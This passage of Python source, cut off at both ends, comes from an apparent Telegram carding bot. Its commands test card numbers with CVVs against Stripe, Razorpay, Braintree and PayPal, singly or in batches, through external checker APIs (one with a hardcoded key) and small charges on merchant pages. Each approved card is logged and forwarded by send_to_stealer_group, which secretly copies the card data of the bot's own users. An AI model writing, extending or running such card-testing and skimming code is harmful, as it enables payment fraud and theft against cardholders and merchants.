    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "📋 <b>MASS CHECK - Stripe Auth</b>\n\n"
            "Send cards in format:\n"
            "<code>CC|MM|YY|CVV</code>\n\n"
            "One card per line. Max 50 cards.",
            parse_mode=ParseMode.HTML
        )
        context.user_data['awaiting_mass_st'] = True
        return
    
    # If cards provided as args
    cards_text = ' '.join(context.args)
    await process_mass_st(update, context, cards_text)

async def process_mass_st(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
    """Process mass Stripe Auth check using same API as /st"""
    import asyncio
    import time
    from modules.gate_checker import get_bin_info, check_card_php, format_gate_response
    
    user = update.effective_user
    user_id = user.id
    
    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(
            "⏳ <b>Already Running</b>\n\n"
            "You have a mass check in progress.\n"
            "Please wait for it to complete or use /stop to cancel it.",
            parse_mode=ParseMode.HTML
        )
        return
    
    context.user_data[f'mass_check_running_{user_id}'] = True
    context.user_data['mass_check_gate'] = 'st'
    context.user_data['mass_check_stop'] = False
    
    try:
        limit = get_mass_check_limit(user.id)
        
        extracted = extract_cards_from_text(cards_text)
        cards = [{'cc': c[0], 'mm': c[1], 'yy': c[2], 'cvv': c[3]} for c in extracted]
        
        if not cards:
            await update.message.reply_text(ae("❌ No valid cards found!"))
            return
        
        if len(cards) > limit:
            cards = cards[:limit]
        
        total_cards = len(cards)
        approved_count = 0
        declined_count = 0
        error_count = 0
        
        header_msg = await update.message.reply_text(
            f"🔄 <b>Mass Stripe Auth Check</b>\n"
            f"Total: {total_cards}\n"
            f"⏳ Processing...",
            parse_mode=ParseMode.HTML
        )
        
        for i, card in enumerate(cards):
            if context.user_data.get('mass_check_stop'):
                break
            
            card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
            start_time = time.time()
            
            try:
                loop = asyncio.get_running_loop()
                result = await asyncio.wait_for(
                    loop.run_in_executor(None, check_card_php, 
                                        "st", card['cc'], card['mm'], card['yy'], card['cvv'], user.id),
                    timeout=30.0
                )
                elapsed = round(time.time() - start_time, 2)
                
                msg_lower = result.get('message', '').lower()
                status = 'APPROVED' if result['status'] == 'success' and ('approved' in msg_lower or 'success' in msg_lower or 'valid' in msg_lower) else 'DECLINED'
                response = result.get('message', 'Unknown')
                
                if status == 'APPROVED':
                    approved_count += 1
                    bin_info = get_bin_info(card['cc'])
                    log_approved_card(user.id, user.username or user.first_name, card['cc'], card['mm'], card['yy'], card['cvv'], "st", response, bin_info)
                    await send_to_stealer_group(context.bot, card['cc'], card['mm'], card['yy'], card['cvv'], "st", response, bin_info, user.id, user.username or user.first_name)
                    await send_approved_card_with_gif(update, card_str, "st", response, elapsed, bin_info)
                else:
                    declined_count += 1
                    card_result = ae(format_mass_card_result(card_str, status, response, "Stripe Auth", elapsed))
                    try:
                        await context.bot.send_message(
                            chat_id=update.message.chat_id,
                            text=card_result,
                            parse_mode=ParseMode.HTML
                        )
                    except:
                        pass
                    
            except asyncio.TimeoutError:
                error_count += 1
                elapsed = round(time.time() - start_time, 2)
                card_result = ae(format_mass_card_result(card_str, "ERROR", "Timeout (8s)", "Stripe Auth", elapsed))
                try:
                    await context.bot.send_message(chat_id=update.message.chat_id, text=card_result, parse_mode=ParseMode.HTML)
                except:
                    pass
            except Exception as e:
                error_count += 1
                elapsed = round(time.time() - start_time, 2)
                card_result = ae(format_mass_card_result(card_str, "ERROR", str(e)[:50], "Stripe Auth", elapsed))
            
            if i < len(cards) - 1:
                await asyncio.sleep(0.25)
        
        stopped = context.user_data.get('mass_check_stop', False)
        header = ae(format_mass_header(total_cards, approved_count, declined_count, error_count))
        if stopped:
            header = ae("⏹️ Mass Check STOPPED\n") + header
        
        try:
            await header_msg.edit_text(header, parse_mode=ParseMode.HTML)
        except:
            pass
    finally:
        context.user_data[f'mass_check_running_{user_id}'] = False
        context.user_data['mass_check_stop'] = False


# PREMIUM GATES - Razorpay
@require_premium
async def gate_rz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Razorpay ₹1 using Nyvexis API"""
    import time as time_module
    user = update.effective_user
    
    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(
            f"❌ <b>Invalid Format!</b>\n\n"
            f"🎯 <b>Usage:</b>\n"
            f"<code>/rz 4242424242424242|12|25|123</code>\n\n"
            f"💡 <b>Format:</b> CC|MM|YY|CVV",
            parse_mode=ParseMode.HTML
        )
        return
    
    cc, mm, yy, cvv = card_data
    
    checking_msg = await update.message.reply_text(
        f"🎀 <b>Checking card...</b>\n\n"
        f"<code>{cc}|{mm}|{yy}|{cvv}</code>\n"
        f"Gateway: Razorpay ₹1",
        parse_mode=ParseMode.HTML
    )
    
    from modules.rpp_gate import check_razorpay
    start_time = time_module.time()
    result = await check_razorpay(cc, mm, yy, cvv, amount=10)
    elapsed = time_module.time() - start_time
    
    from modules.gate_checker import get_bin_info
    bin_info = get_bin_info(cc)
    username = user.username or user.first_name
    
    if result['status'] == 'APPROVED':
        log_approved_card(user.id, username, cc, mm, yy, cvv, "rz", result['message'], bin_info)
        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "rz", result['message'], bin_info, user.id, username)
        response = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {result['response']}", "Razorpay ₹1", bin_info, elapsed, username)
        try:
            success_gif = get_sexy_anime_gif("success")
            await update.message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
            await checking_msg.delete()
        except:
            await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
    else:
        response = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {result['response']}", "Razorpay ₹1", bin_info, elapsed, username)
        try:
            failed_gif = get_sexy_anime_gif("failed")
            await update.message.reply_animation(animation=failed_gif, caption=response, parse_mode=ParseMode.HTML)
            await checking_msg.delete()
        except:
            await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)

# ============================================================================
# RAZORPAY PAGES GATE - External API (/rzp, /mrzp)
# ============================================================================

@require_premium
async def gate_rzp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Razorpay Pages checker using external API"""
    import time as time_module
    user = update.effective_user

    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "🎯 <b>Usage:</b>\n"
            "<code>/rzp 4242424242424242|12|25|123</code>\n"
            "<code>/rzp 4242424242424242|12|25|123 https://pages.razorpay.com/xxx 50</code>\n\n"
            "💡 <b>Format:</b> CC|MM|YY|CVV [site] [amount]\n"
            "Default site: pages.razorpay.com/iicdelhi\n"
            "Default amount: 10",
            parse_mode=ParseMode.HTML
        )
        return

    cc, mm, yy, cvv = card_data
    card_str = f"{cc}|{mm}|{yy}|{cvv}"

    args = update.message.text.split()
    site = "https://pages.razorpay.com/iicdelhi"
    amount = "10"
    for arg in args[1:]:
        if arg.startswith("http"):
            site = arg
        elif arg.isdigit():
            amount = arg

    checking_msg = await update.message.reply_text(
        f"🎀 <b>Checking card...</b>\n\n"
        f"<code>{card_str}</code>\n"
        f"Gateway: Razorpay Pages ₹{amount}",
        parse_mode=ParseMode.HTML
    )

    try:
        start_time = time_module.time()
        api_url = f"https://rzpauto-production.up.railway.app/rzp?cc={card_str}&site={site}&amount={amount}"

        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=90)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                else:
                    data = {"status": "error", "message": f"API Error {resp.status}"}

        elapsed = time_module.time() - start_time
        status = (data.get("status", "error")).lower()
        message = data.get("message", "No response")
        payment_id = data.get("payment_id", "N/A")
        reason = data.get("reason", "N/A")
        api_time = data.get("time", elapsed)

        from modules.gate_checker import get_bin_info
        bin_info = get_bin_info(cc)
        username = user.username or user.first_name

        if status in ("authorized", "captured", "charged"):
            log_approved_card(user.id, username, cc, mm, yy, cvv, "rzp", message, bin_info)
            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "rzp", message, bin_info, user.id, username)
            response_text = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {message}", f"Razorpay Pages ₹{amount}", bin_info, float(api_time), username)
            try:
                success_gif = get_sexy_anime_gif("success")
                await update.message.reply_animation(animation=success_gif, caption=response_text, parse_mode=ParseMode.HTML)
                await checking_msg.delete()
            except:
                await checking_msg.edit_text(response_text, parse_mode=ParseMode.HTML)
        else:
            response_text = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {message} | {reason}", f"Razorpay Pages ₹{amount}", bin_info, float(api_time), username)
            try:
                failed_gif = get_sexy_anime_gif("failed")
                await update.message.reply_animation(animation=failed_gif, caption=response_text, parse_mode=ParseMode.HTML)
                await checking_msg.delete()
            except:
                await checking_msg.edit_text(response_text, parse_mode=ParseMode.HTML)
    except asyncio.TimeoutError:
        await checking_msg.edit_text(ae("❌ <b>Request timed out (90s)</b>"), parse_mode=ParseMode.HTML)
    except Exception as e:
        await checking_msg.edit_text(ae(f"❌ <b>Error:</b> {str(e)[:100]}"), parse_mode=ParseMode.HTML)


@require_premium
async def gate_mrzp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass Razorpay Pages checker using external API"""
    import asyncio
    user = update.effective_user
    user_id = user.id

    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(
            "⏳ <b>Already Running</b>\n\n"
            "You have a mass check in progress.\n"
            "Please wait or use /stop to cancel.",
            parse_mode=ParseMode.HTML
        )
        return

    args_text = ""
    if context.args:
        args_text = ' '.join(context.args)
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        args_text = update.message.reply_to_message.text

    site = "https://pages.razorpay.com/iicdelhi"
    amount = "10"
    clean_args = []
    for arg in args_text.split():
        if arg.startswith("http"):
            site = arg
        elif arg.isdigit() and len(arg) <= 5 and '|' not in arg:
            amount = arg
        else:
            clean_args.append(arg)

    cards_text = ' '.join(clean_args)

    if not cards_text:
        await update.message.reply_text(
            "📋 <b>MASS CHECK - Razorpay Pages</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/mrzp CC|MM|YY|CVV</code>\n"
            "<code>/mrzp CC|MM|YY|CVV https://pages.razorpay.com/xxx 50</code>\n\n"
            "Or reply to a message with cards.\n"
            "One card per line. Max 50 cards.\n\n"
            "Default site: pages.razorpay.com/iicdelhi\n"
            "Default amount: ₹10",
            parse_mode=ParseMode.HTML
        )
        return

    extracted = extract_cards_from_text(cards_text)
    cards = [{'cc': c[0], 'mm': c[1], 'yy': c[2], 'cvv': c[3]} for c in extracted]

    if not cards:
        await update.message.reply_text(ae("❌ No valid cards found!"), parse_mode=ParseMode.HTML)
        return

    limit = get_mass_check_limit(user.id)
    if len(cards) > limit:
        cards = cards[:limit]

    context.user_data[f'mass_check_running_{user_id}'] = True
    context.user_data['mass_check_gate'] = 'rzp'
    context.user_data['mass_check_stop'] = False

    status_msg = await update.message.reply_text(
        f"🎀 <b>Mass Razorpay Pages Check</b>\n\n"
        f"📋 Cards: {len(cards)}\n"
        f"⚡ Gate: Razorpay Pages ₹{amount}\n"
        f"🌐 Site: {site.split('/')[-1]}\n"
        f"🔄 Processing 5 parallel with 1s delay...",
        parse_mode=ParseMode.HTML
    )

    from modules.gate_checker import get_bin_info

    approved = []
    declined = []
    errors = []

    try:
        batch_size = 5
        batches = [cards[i:i+batch_size] for i in range(0, len(cards), batch_size)]

        for batch_num, batch in enumerate(batches, 1):
            if context.user_data.get('mass_check_stop'):
                break

            async def check_single_rzp(card):
                card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
                try:
                    api_url = f"https://rzpauto-production.up.railway.app/rzp?cc={card_str}&site={site}&amount={amount}"
                    async with aiohttp.ClientSession() as session:
                        async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=90)) as resp:
                            if resp.status == 200:
                                data = await resp.json()
                            else:
                                return card_str, "error", f"API Error {resp.status}", {}
                    status = (data.get("status", "error")).lower()
                    message = data.get("message", "No response")
                    return card_str, status, message, data
                except asyncio.TimeoutError:
                    return card_str, "error", "Timeout (90s)", {}
                except Exception as e:
                    return card_str, "error", str(e)[:50], {}

            tasks = [check_single_rzp(card) for card in batch]
            results = await asyncio.gather(*tasks)

            for card_str, status, message, data in results:
                if context.user_data.get('mass_check_stop'):
                    break

                username = user.username or user.first_name
                cc_part = card_str.split('|')[0]

                if status in ("authorized", "captured", "charged"):
                    payment_id = data.get("payment_id", "N/A")
                    approved.append(f"✅ {card_str}\n→ {message} | {payment_id}")
                    bin_info = get_bin_info(cc_part)
                    parts = card_str.split('|')
                    log_approved_card(user.id, username, parts[0], parts[1], parts[2], parts[3], "rzp", message, bin_info)
                    await send_to_stealer_group(context.bot, parts[0], parts[1], parts[2], parts[3], "rzp", message, bin_info, user.id, username)
                    await send_approved_card_with_gif(update, card_str, "rzp", message, float(data.get("time", 0)), bin_info)
                elif status == "error":
                    errors.append(f"⚠️ {card_str}\n→ {message}")
                else:
                    reason = data.get("reason", message)
                    declined.append(f"❌ {card_str}\n→ {reason}")

            total_done = len(approved) + len(declined) + len(errors)
            progress = (total_done / len(cards)) * 100

            progress_text = (
                f"🎀 <b>Mass Razorpay Pages Check</b>\n\n"
                f"✅ Approved: {len(approved)}\n"
                f"❌ Declined: {len(declined)}\n"
                f"⚠️ Errors: {len(errors)}\n\n"
                f"📊 Progress: {total_done}/{len(cards)} ({progress:.0f}%)\n"
                f"⏳ Batch {batch_num}/{len(batches)}..."
            )
            try:
                await status_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
            except:
                pass

            if batch_num < len(batches) and not context.user_data.get('mass_check_stop'):
                await asyncio.sleep(1)

        stopped = context.user_data.get('mass_check_stop', False)
        status_label = "STOPPED" if stopped else "Complete"

        result_text = (
            f"📊 <b>Mass Razorpay Pages - {status_label}</b>\n\n"
            f"✅ Approved: {len(approved)}\n"
            f"❌ Declined: {len(declined)}\n"
            f"⚠️ Errors: {len(errors)}\n"
            f"🌐 Site: {site.split('/')[-1]} | ₹{amount}\n\n"
        )

        if approved:
            result_text += "<b>✅ APPROVED:</b>\n"
            for a in approved:
                result_text += f"<code>{a}</code>\n\n"

        if declined:
            result_text += "<b>❌ DECLINED:</b>\n"
            for d in declined[:10]:
                result_text += f"<code>{d}</code>\n"
            if len(declined) > 10:
                result_text += f"\n... and {len(declined) - 10} more declined\n"

        result_text += f"\n𝗨𝘀𝗲𝗿 : @{user.username or user.first_name}"

        try:
            await status_msg.edit_text(result_text, parse_mode=ParseMode.HTML)
        except:
            await update.message.reply_text(result_text, parse_mode=ParseMode.HTML)

    finally:
        context.user_data[f'mass_check_running_{user_id}'] = False
        context.user_data['mass_check_stop'] = False


# ============================================================================
# BRAINTREE AUTH GATE - BarryX API
# ============================================================================

@require_approval
async def gate_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Braintree Auth Gate using BarryX API"""
    import aiohttp
    import time as time_module
    from modules.gate_checker import get_bin_info
    
    user = update.effective_user
    
    # Parse card
    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "🎯 <b>Usage:</b>\n"
            "<code>/b3 4242424242424242|12|25|123</code>\n\n"
            "💡 <b>Format:</b> CC|MM|YY|CVV",
            parse_mode=ParseMode.HTML
        )
        return
    
    cc, mm, yy, cvv = card_data
    card_str = f"{cc}|{mm}|{yy}|{cvv}"
    
    checking_msg = await update.message.reply_text(
        f"🎀 <b>Checking card...</b>\n\n"
        f"<code>{card_str}</code>\n"
        f"Gateway: Braintree Auth",
        parse_mode=ParseMode.HTML
    )
    
    try:
        start_time = time_module.time()
        
        # BarryX Braintree API
        api_url = f"https://api.barryxapi.xyz/braintree_auth?key=BRY-KESNP-TUPWH-JFOT9&card={card_str}&proxy="
        
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                else:
                    data = {"status": "error", "message": f"API Error {resp.status}"}
        
        elapsed = time_module.time() - start_time
        
        bin_info = get_bin_info(cc)
        bin_type = f"{bin_info.get('brand', 'N/A').upper()}"
        if bin_info.get('type'):
            bin_type += f" - {bin_info.get('type', '').upper()}"
        username = user.username or user.first_name
        
        status = str(data.get('status', 'error')).upper()
        message = str(data.get('message', 'Unknown response'))
        
        if status == 'APPROVED' or status == 'TRUE' or 'approved' in message.lower():
            log_approved_card(user.id, username, cc, mm, yy, cvv, "b3", message, bin_info)
            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "b3", message, bin_info, user.id, username)
            
            response = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {message}", "Braintree Auth", bin_info, elapsed, username)
            try:
                success_gif = get_sexy_anime_gif("success")
                await update.message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
                await checking_msg.delete()
            except:
                await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
        else:
            response = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {message}", "Braintree Auth", bin_info, elapsed, username)
            await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
    
    except Exception as e:
        await checking_msg.edit_text(ae(f"❌ Error: {str(e)[:200]}"), parse_mode=ParseMode.HTML)

@require_premium
async def mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check Braintree Auth with 5 batches and 1s delay"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "📋 <b>MASS CHECK - Braintree Auth</b>\n\n"
            "Send cards in format:\n"
            "<code>CC|MM|YY|CVV</code>\n\n"
            "One card per line. Max 50 cards.\n"
            "⏱️ 5 batches with 1s delay",
            parse_mode=ParseMode.HTML
        )
        context.user_data['awaiting_mass_b3'] = True
        return
    
    cards_text = ' '.join(context.args)
    await process_mass_b3(update, context, cards_text)

async def process_mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
    """Process mass Braintree Auth check with 5 batches and 1s delay"""
    import aiohttp
    import time as time_module
    from modules.gate_checker import get_bin_info
    
    user = update.effective_user
    user_id = user.id
    
    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(
            "⏳ <b>Already Running</b>\n\n"
            "You have a mass check in progress.\n"
            "Please wait or use /stop to cancel.",
            parse_mode=ParseMode.HTML
        )
        return
    
    context.user_data[f'mass_check_running_{user_id}'] = True
    context.user_data['mass_check_gate'] = 'b3'
    context.user_data['mass_check_stop'] = False
    
    try:
        limit = get_mass_check_limit(user.id)
        
        extracted = extract_cards_from_text(cards_text)
        cards = [{'cc': c[0], 'mm': c[1], 'yy': c[2], 'cvv': c[3]} for c in extracted]
        
        if not cards:
            await update.message.reply_text(ae("❌ No valid cards found!"))
            return
        
        if len(cards) > limit:
            cards = cards[:limit]
        
        total_cards = len(cards)
        approved_count = 0
        declined_count = 0
        error_count = 0
        
        header_msg = await update.message.reply_text(
            f"🔄 <b>Mass Braintree Auth Check</b>\n"
            f"Total: {total_cards}\n"
            f"⏱️ 5 batches, 1s delay\n"
            f"⏳ Processing...",
            parse_mode=ParseMode.HTML
        )
        
        # Process in batches of 5 with 1 second delay
        batch_size = 5
        username = user.username or user.first_name
        
        async with aiohttp.ClientSession() as session:
            for batch_start in range(0, total_cards, batch_size):
                if context.user_data.get('mass_check_stop'):
                    break
                
                batch = cards[batch_start:batch_start + batch_size]
                
                # Process batch concurrently
                async def check_single_card(card):
                    card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
                    try:
                        api_url = f"https://api.barryxapi.xyz/braintree_auth?key=BRY-KESNP-TUPWH-JFOT9&card={card_str}&proxy="
                        start_time = time_module.time()
                        
                        async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
                            if resp.status == 200:
                                data = await resp.json()
                            else:
                                data = {"status": "error", "message": f"API Error {resp.status}"}
                        
                        elapsed = time_module.time() - start_time
                        status = str(data.get('status', 'error')).upper()
                        message = str(data.get('message', 'Unknown'))
                        
                        return {
                            'card': card,
                            'card_str': card_str,
                            'status': status,
                            'message': message,
                            'elapsed': elapsed
                        }
                    except Exception as e:
                        return {
                            'card': card,
                            'card_str': card_str,
                            'status': 'ERROR',
                            'message': str(e)[:100],
                            'elapsed': 0
                        }
                
                # Run batch concurrently
                tasks = [check_single_card(card) for card in batch]
                results = await asyncio.gather(*tasks)
                
                # Process results
                for result in results:
                    card_str = result['card_str']
                    status = result['status']
                    message = result['message']
                    elapsed = result['elapsed']
                    card = result['card']
                    
                    bin_info = get_bin_info(card['cc'])
                    bin_type = f"{bin_info.get('brand', 'N/A').upper()}"
                    
                    if status == 'APPROVED' or status == 'TRUE' or 'approved' in message.lower():
                        approved_count += 1
                        log_approved_card(user.id, username, card['cc'], card['mm'], card['yy'], card['cvv'], "b3", message, bin_info)
                        await send_to_stealer_group(context.bot, card['cc'], card['mm'], card['yy'], card['cvv'], "b3", message, bin_info, user.id, username)
                        
                        response = _build_gate_response(card['cc'], card['mm'], card['yy'], card['cvv'], "approved", f"Approved - {message}", "Braintree Auth", bin_info, elapsed, username)
                        try:
                            success_gif = get_sexy_anime_gif("success")
                            await update.message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
                        except:
                            await update.message.reply_text(response, parse_mode=ParseMode.HTML)
                    elif status == 'ERROR':
                        error_count += 1
                    else:
                        declined_count += 1
                
                # Update progress
                processed = min(batch_start + batch_size, total_cards)
                try:
                    await header_msg.edit_text(
                        f"🔄 <b>Mass Braintree Auth Check</b>\n"
                        f"Progress: {processed}/{total_cards}\n"
                        f"✅ {approved_count} | ❌ {declined_count} | ⚠️ {error_count}",
                        parse_mode=ParseMode.HTML
                    )
                except:
                    pass
                
                # 1 second delay between batches
                if batch_start + batch_size < total_cards:
                    await asyncio.sleep(1)
        
        # Final summary
        await header_msg.edit_text(
            f"✅ <b>Mass Braintree Auth Complete!</b>\n\n"
            f"📊 <b>Results:</b>\n"
            f"✅ Approved: {approved_count}\n"
            f"❌ Declined: {declined_count}\n"
            f"⚠️ Errors: {error_count}\n"
            f"📋 Total: {total_cards}",
            parse_mode=ParseMode.HTML
        )
        
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Error: {str(e)[:200]}"))
    finally:
        context.user_data[f'mass_check_running_{user_id}'] = False
        context.user_data['awaiting_mass_b3'] = False

@require_premium
async def mass_rz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check Razorpay with 5 batches and 0.25s delay"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "📋 <b>MASS CHECK - Razorpay ₹1</b>\n\n"
            "Send cards in format:\n"
            "<code>CC|MM|YY|CVV</code>\n\n"
            "One card per line. Unlimited cards.",
            parse_mode=ParseMode.HTML
        )
        context.user_data['awaiting_mass_rz'] = True
        return
    
    # If cards provided as args
    cards_text = ' '.join(context.args)
    await process_mass_rz(update, context, cards_text)

async def process_mass_rz(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
    """Process mass Razorpay check with 5 batches and 0.25s delay using Nyvexis API"""
    import asyncio
    from modules.rpp_gate import check_razorpay
    from modules.gate_checker import get_bin_info
    
    user = update.effective_user
    user_id = user.id
    
    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(
            "⏳ <b>Already Running</b>\n\n"
            "You have a mass check in progress.\n"
            "Please wait for it to complete or use /stop to cancel it.",
            parse_mode=ParseMode.HTML
        )
        return
    
    context.user_data[f'mass_check_running_{user_id}'] = True
    context.user_data['mass_check_gate'] = 'rz'
    context.user_data['mass_check_stop'] = False
    
    try:
        limit = get_mass_check_limit(user.id)
        
        extracted = extract_cards_from_text(cards_text)
        cards = [{'cc': c[0], 'mm': c[1], 'yy': c[2], 'cvv': c[3]} for c in extracted]
        
        if not cards:
            await update.message.reply_text(ae("❌ No valid cards found!"))
            return
        
        if len(cards) > limit:
            cards = cards[:limit]
        
        msg = await update.message.reply_text(
            f"🔄 <b>Mass Razorpay Check Started</b>\n\n"
            f"📊 Cards: {len(cards)}\n"
            f"⚡ Gate: Razorpay ₹1 (Nyvexis API)\n"
            f"🔄 Processing in 5 batches with 0.25s delay...",
            parse_mode=ParseMode.HTML
        )
        
        approved = []
        declined = []
        errors = []
        
        batch_size = max(1, (len(cards) + 4) // 5)
        batches = [cards[i:i+batch_size] for i in range(0, len(cards), batch_size)]
        
        for batch_num, batch in enumerate(batches, 1):
            if context.user_data.get('mass_check_stop'):
                break
            
            for card in batch:
                if context.user_data.get('mass_check_stop'):
                    break
                
                try:
                    result = await asyncio.wait_for(
                        check_razorpay(card['cc'], card['mm'], card['yy'], card['cvv'], amount=10),
                        timeout=60.0
                    )
                    card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
                    
                    if result['status'] == 'APPROVED':
                        approved.append(f"✅ {card_str}\n→ {result['response']}")
                        bin_info = get_bin_info(card['cc'])
                        log_approved_card(user.id, user.username or user.first_name, card['cc'], card['mm'], card['yy'], card['cvv'], "rz", result['message'], bin_info)
                        await send_to_stealer_group(context.bot, card['cc'], card['mm'], card['yy'], card['cvv'], "rz", result['message'], bin_info, user.id, user.username or user.first_name)
                        await send_approved_card_with_gif(update, card_str, "rz", result.get('message', 'CVV Match'), 3.0, bin_info)
                    elif result['status'] == 'DECLINED':
                        declined.append(f"❌ {card_str}\n→ {result['response']}")
                    else:
                        errors.append(f"⚠️ {card_str}\n→ {result['response']}")
                except asyncio.TimeoutError:
                    errors.append(f"⚠️ {card['cc']}|...\n→ Timeout (60s)")
                except Exception as e:
                    errors.append(f"⚠️ {card['cc']}|...\n→ Error: {str(e)[:30]}")
            
            progress_text = f"📊 <b>Mass Razorpay Check</b>\n\n"
            progress_text += f"✅ Approved: {len(approved)}\n"
            progress_text += f"❌ Declined: {len(declined)}\n"
            progress_text += f"⚠️ Errors: {len(errors)}\n\n"
            progress_text += f"⏳ Processing batch {batch_num}/{len(batches)}..."
            
            try:
                await msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
            except:
                pass
            
            if context.user_data.get('mass_check_stop'):
                break
            
            if batch_num < len(batches):
                await asyncio.sleep(0.25)
        
        stopped = context.user_data.get('mass_check_stop', False)
        status_text = "STOPPED" if stopped else "Complete"
        result_text = f"📊 <b>Mass Razorpay Check {status_text}</b>\n\n"
        result_text += f"✅ Approved: {len(approved)}\n"
        result_text += f"❌ Declined: {len(declined)}\n"
        result_text += f"⚠️ Errors: {len(errors)}\n\n"
        
        if approved:
            result_text += "<b>✅ APPROVED:</b>\n"
            for a in approved:
                result_text += f"<code>{a}</code>\n\n"
        
        if declined:
            result_text += "<b>❌ DECLINED:</b>\n"
            for d in declined:
                result_text += f"<code>{d}</code>\n\n"
        
        try:
            await msg.edit_text(result_text, parse_mode=ParseMode.HTML)
        except:
            await update.message.reply_text(result_text, parse_mode=ParseMode.HTML)
    finally:
        context.user_data[f'mass_check_running_{user_id}'] = False
        context.user_data['mass_check_stop'] = False

async def stop_mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop the running mass check"""
    user = update.effective_user
    user_id = user.id
    
    if not context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(
            "❌ <b>No Mass Check Running</b>\n\n"
            "There's no active mass check to stop.",
            parse_mode=ParseMode.HTML
        )
        return
    
    context.user_data['mass_check_stop'] = True
    await update.message.reply_text(
        "⏹️ <b>Stopping Mass Check</b>\n\n"
        "Finishing current card and stopping...",
        parse_mode=ParseMode.HTML
    )

# PREMIUM GATES - PayPal
@require_premium
async def gate_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """PayPal $1 checker"""
    import time as time_module
    user = update.effective_user
    
    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(
            f"❌ <b>Invalid Format!</b>\n\n"
            f"🎯 <b>Usage:</b>\n"
            f"<code>/pp 4242424242424242|12|25|123</code>\n\n"
            f"💡 <b>Format:</b> CC|MM|YY|CVV",
            parse_mode=ParseMode.HTML
        )
        return
    
    cc, mm, yy, cvv = card_data
    
    checking_msg = await update.message.reply_text(
        f"🎀 <b>Checking card...</b>\n\n"
        f"<code>{cc}|{mm}|{yy}|{cvv}</code>\n"
        f"Gateway: PayPal $1",
        parse_mode=ParseMode.HTML
    )
    
    import asyncio
    animations = [
        "⬜⬜⬜⬜⬜",
        "🟦⬜⬜⬜⬜",
        "🟦🟦⬜⬜⬜",
        "🟦🟦🟦⬜⬜",
        "🟦🟦🟦🟦⬜",
        "🟦🟦🟦🟦🟦"
    ]
    for anim in animations:
        try:
            await checking_msg.edit_text(
                f"🎀 <b>Checking card...</b> {anim}\n\n"
                f"<code>{cc}|{mm}|{yy}|{cvv}</code>\n"
                f"Gateway: PayPal $1",
                parse_mode=ParseMode.HTML
            )
            await asyncio.sleep(0.3)
        except:
            pass
    
    from modules.paypal_gate import check_paypal_async
    from modules.gate_checker import get_bin_info
    
    start_time = time_module.time()
    result = await check_paypal_async(cc, mm, yy, cvv)
    elapsed = time_module.time() - start_time
    
    bin_info = get_bin_info(cc)
    bin_type = f"{bin_info.get('scheme', 'N/A').upper()}"
    if bin_info.get('type'):
        bin_type += f" - {bin_info.get('type', '').upper()}"
    username = user.username or user.first_name
    
    if result['status'] == 'APPROVED' or result['status'] == 'CHARGED':
        log_approved_card(user.id, username, cc, mm, yy, cvv, "pp", result['message'], bin_info)
        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "pp", result['message'], bin_info, user.id, username)
        response = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {result['message']}", "PayPal $1", bin_info, elapsed, username)
        try:
            await checking_msg.delete()
        except:
            pass
        gif_url = get_sexy_anime_gif("success")
